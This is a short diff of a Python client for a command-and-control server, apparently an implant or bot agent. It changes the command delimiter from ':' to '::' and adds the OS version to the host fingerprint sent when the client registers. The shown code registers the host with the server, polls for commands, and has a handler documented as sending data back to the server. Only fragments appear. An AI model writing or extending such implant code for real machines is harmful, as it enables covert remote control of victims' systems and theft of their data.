@@ -62,7 +62,7 @@ def handle(data):
 	"""
 	Handle incoming commands from C2
 	Args:
-		data: string with command format key:data:parameters:integrity, now list
+		data: string with command format key::data::parameters::integrity, now list
 
 	Returns: sends data to C2 server
 
@@ -94,7 +94,7 @@ def register():
 	uname = get_uname()
 	generate_id()
 	global c2_id
-	code = make_post("register", f"{uname}:{c2_id}")
+	code = make_post("register", f"{uname}::{c2_id}")
 	if code == 200:
 		return True
 	return False
@@ -130,7 +130,7 @@ def get_uname():
 
 	Returns: the string containing uname string
 	"""
-	return f"{os.uname().sysname} {os.uname().release} {os.uname().machine}"
+	return f"{os.uname().sysname} {os.uname().release} {os.uname().version} {os.uname().machine}"
 
 
 def generate_id():
@@ -337,7 +337,7 @@ if __name__ == "__main__":
 
 		if last_commands != cmd_hash:
 			for cmd in cmds:
-				handle(cmd.split(":"))
+				handle(cmd.split("::"))
 			last_commands = cmd_hash
 		else:
 			print("No change from C2")
